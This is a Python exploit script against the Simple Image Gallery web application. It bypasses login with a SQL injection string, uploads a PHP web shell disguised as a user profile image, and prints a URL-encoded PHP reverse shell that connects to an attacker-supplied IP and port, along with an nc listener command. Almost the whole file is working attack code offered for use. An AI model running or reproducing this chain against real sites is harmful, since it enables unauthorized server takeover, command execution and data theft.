# RCE in Simple Image Gallery to get a reverse shell

from bs4 import BeautifulSoup
import argparse
import requests
import json


# Get the url from the user
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="URL of the website", required=True)
parser.add_argument("-l", "--ip", help="Localhost IP address", required=True)
parser.add_argument("-p", "--port", help="Reverse shell port", required=True)
args = parser.parse_args()

# Formulate the payload
request_url = args.url + "/classes/Login.php?f=login"
payload = "<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>"
data = {"username": "admin' or '1'='1'#", "password": ""}

def post(url, data):
    session = requests.session()

    response = session.post(url, data=data)
    response_data = response.text
    data = json.loads(response_data)
    status = data["status"]

    if status == "success":
        request_url = args.url + "?page=user"
        # make a get request to the user page
        response = session.get(request_url)
        parser = BeautifulSoup(response.text, "html.parser")

        shellname = "shell"

        # get the user id, username, firstname and lastname from the page
        ids = parser.find('input', {'name':'id'}).get("value")
        username = parser.find("input", {"name": "username"}).get("value")
        firstname = parser.find("input", {"name": "firstname"}).get("value")
        lastname = parser.find("input", {"name": "lastname"}).get("value")
        print("User ID: " + ids)

        request_url = args.url + "/classes/Users.php?f=save"
        request_headers = {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary9nI3gVmJoEZoZyeA"}
        request_data = "------WebKitFormBoundary9nI3gVmJoEZoZyeA\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n"+ids+"\r\n------WebKitFormBoundary9nI3gVmJoEZoZyeA\r\nContent-Disposition: form-data; name=\"firstname\"\r\n\r\n"+firstname+"\r\n------WebKitFormBoundary9nI3gVmJoEZoZyeA\r\nContent-Disposition: form-data; name=\"lastname\"\r\n\r\n"+lastname+"\r\n------WebKitFormBoundary9nI3gVmJoEZoZyeA\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n"+username+"\r\n------WebKitFormBoundary9nI3gVmJoEZoZyeA\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n\r\n------WebKitFormBoundary9nI3gVmJoEZoZyeA\r\nContent-Disposition: form-data; name=\"img\"; filename=\""+shellname+".php\"\r\nContent-Type: application/octet-stream\r\n\r\n"+payload+"\r\n------WebKitFormBoundary9nI3gVmJoEZoZyeA--\r\n"

        response = session.post(request_url, headers=request_headers, data=request_data)
        if response.text == "1":
            request_url = args.url + "/?page=user"
            response = session.get(request_url)
            parser = BeautifulSoup(response.text, "html.parser")

            revshell = "php%20-r%20%27%24sock%3Dfsockopen%28%22" + args.ip + "%22%2C" + args.port + "%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27"
            shell = parser.find('img', {'id':'cimg'})
            print("Shell URL: " + shell.get("src") + "?cmd=" + revshell)

post(request_url, data)
print("Setup a listener with nc -lvnp " + args.port)
print("Go to the shell URL in your browser to get a reverse shell")

# Saskia Lablans